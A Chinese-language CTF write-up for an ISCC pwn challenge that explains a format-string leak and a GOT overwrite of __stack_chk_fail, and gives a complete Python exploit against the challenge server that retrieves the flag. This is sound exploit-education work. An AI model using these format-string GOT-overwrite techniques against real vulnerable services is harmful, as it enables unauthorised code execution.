
## 解题过程

本题提供的附件为64位ELF可执行文件，开启了PIE机制。安全保护方面启用了Canary、NX机制以及Partial RELRO。程序的核心交互逻辑位于 `process_emergency_command` 函数中，该函数会连续两次接收用户的输入。

程序存在两个主要的安全缺陷：首先是直接调用 `printf(buf)` 造成的格式化字符串漏洞；其次是在调用 `read(0, buf, 0x7c)` 时，读取的数据长度超出了大小为 0x68 字节的栈缓冲区，从而引发了栈溢出（越界写入）。

通过对二进制文件进行静态分析和反汇编，能够发现程序内部预留了一个名为 `system_reboot_comms` 的后门函数。该函数在输出提示信息后，会直接执行 `system("cat flag.txt")` 命令。

在第一阶段的利用中，完全无需进行暴力破解。利用格式化字符串漏洞，通过发送类似 `%20$p` 至 `%35$p` 的 payload 泄露栈上数据，即可精准捕捉到 `main` 函数地址和返回地址，进而计算出程序的 PIE 内存基址。

在进行本地测试时发现，如果尝试直接覆盖部分返回地址来劫持控制流跳向后门，会导致栈空间未对齐而崩溃；此外，若尝试利用格式化字符串将 `fflush@got` 劫持为后门函数地址，则会由于该后门函数内也调用了 `fflush`，从而引发无限递归问题。

因此，更加可靠的利用思路是在第二步交互中，利用格式化字符串将GOT表中的 `__stack_chk_fail@got` 指针改写为 `system_reboot_comms` 函数的真实入口地址。这样一来，当Canary检查失败并触发异常处理时，程序便会以常规的 `call` 指令语义跳转并执行后门代码。

为成功触发上述机制，我们在发送第二次payload时，只需在格式化串利用代码之后附加足够的垃圾数据，确保总输入量大于 104 字节即可。这样做的目的是蓄意覆盖并破坏栈上的 Canary 值，整个过程完全不需要去泄露真实的 Canary 到底是多少。

综上所述，该攻击路径只需建立一次网络连接并发送两次数据包，既规避了多线程并发请求，又省去了爆破环节，非常契合本题对远程靶机环境的限制条件。

运行脚本并在远程服务器执行，最终成功获取到了真正的 flag：`ISCC{62d0908f-196e-4fdf-8a42-9c14e56a7347}`。

## 利用程序

```python
#!/usr/bin/env python3
import re
import socket
import struct

HOST = "39.96.193.120"
PORT = 10009
TIMEOUT = 8
MAIN_OFF = 0x13CC
RET2WIN_OFF = 0x1229
STACK_CHK_FAIL_GOT_OFF = 0x4020
PRINTF_BUF_ARG = 8
LEAK = "|".join(f"%{i}$p" for i in range(20, 36)).encode() + b"\n"

def read_until(conn, token=b"> "):
    conn.settimeout(TIMEOUT)
    blob = b""
    while token not in blob:
        piece = conn.recv(4096)
        if not piece:
            break
        blob += piece
    return blob

def read_flag(conn):
    conn.settimeout(TIMEOUT)
    blob = b""
    while True:
        try:
            piece = conn.recv(4096)
        except (socket.timeout, ConnectionResetError):
            break
        if not piece:
            break
        blob += piece
        m = re.search(rb"ISCC\{[^}]+\}", blob)
        if m:
            return m.group().decode()
    m = re.search(rb"ISCC\{[^}]+\}", blob)
    if not m:
        raise RuntimeError("flag not found")
    return m.group().decode()

def align_up(v, step):
    return (v + step - 1) // step * step

def calc_base(blob):
    vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", blob)]
    entry = next(v for v in vals if (v & 0xFFF) == 0x3CC and (v + 0x2F) in vals)
    return entry - MAIN_OFF

def make_payload(base_addr):
    goal = base_addr + RET2WIN_OFF
    got = base_addr + STACK_CHK_FAIL_GOT_OFF
    writes = [
        (goal & 0xFFFF, got),
        ((goal >> 16) & 0xFFFF, got + 2),
        ((goal >> 32) & 0xFFFF, got + 4),
    ]
    writes.sort(key=lambda x: x[0])

    begin = 13
    while True:
        printed = 0
        parts = []
        for i, (val, _) in enumerate(writes):
            delta = (val - printed) & 0xFFFF
            if delta:
                parts.append(f"%1${delta}c")
                printed = val
            parts.append(f"%{begin + i}$hn")
        fmt = "".join(parts).encode()
        off = align_up(len(fmt) + 1, 8)
        new_start = PRINTF_BUF_ARG + off // 8
        if new_start == begin:
            break
        begin = new_start

    packet = fmt + b"\x00" + b"P" * (off - len(fmt) - 1)
    packet += b"".join(struct.pack("<Q", addr) for _, addr in writes)
    if len(packet) <= 104:
        packet += b"Q" * (105 - len(packet))
    return packet + b"\n"

def entry():
    conn = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    read_until(conn)
    conn.sendall(LEAK)
    leak = read_until(conn)
    base_addr = calc_base(leak)
    conn.sendall(make_payload(base_addr))
    print(read_flag(conn))

if __name__ == "__main__":
    entry()
```

## 结果

```text
ISCC{62d0908f-196e-4fdf-8a42-9c14e56a7347}
```